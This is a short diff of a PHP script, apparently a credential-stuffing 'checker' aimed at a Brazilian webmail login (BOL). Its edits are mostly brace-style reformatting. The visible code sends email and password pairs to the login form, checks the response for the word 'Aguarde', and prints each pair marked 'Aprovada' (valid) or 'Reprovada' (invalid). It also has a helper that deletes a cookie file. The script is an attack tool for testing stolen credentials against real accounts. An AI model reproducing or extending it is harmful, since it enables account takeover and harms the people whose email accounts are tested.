@@ -13,8 +13,7 @@ function getStr($string, $start, $end)
 
 function deletarCookies()
 {
-    if (file_exists("cookie.txt"))
-    {
+    if (file_exists("cookie.txt")) {
         unlink("cookie.txt");
     }
 }
@@ -46,14 +45,9 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'skin=bol-default&dest=WEBMAIL&user=' . $em
 
 $data = curl_exec($ch);
 
-if (!strpos($data, 'Aguarde'))
-{
+if (!strpos($data, 'Aguarde')) {
     echo ' <font color="red" style="font-weight: #C0392B;">#Reprovada </font> ' . $email . '|' . $senha . '<font color="#333333"></font>';
-}
-else
-{
+} else {
 
     echo ' <font color="green" style="font-weight: bold;">#Aprovada </font> <font color="#D0D3D4"> ' . $email . '|' . $senha . '</font> <font color="#333333"></font>';
 }
-
-?>
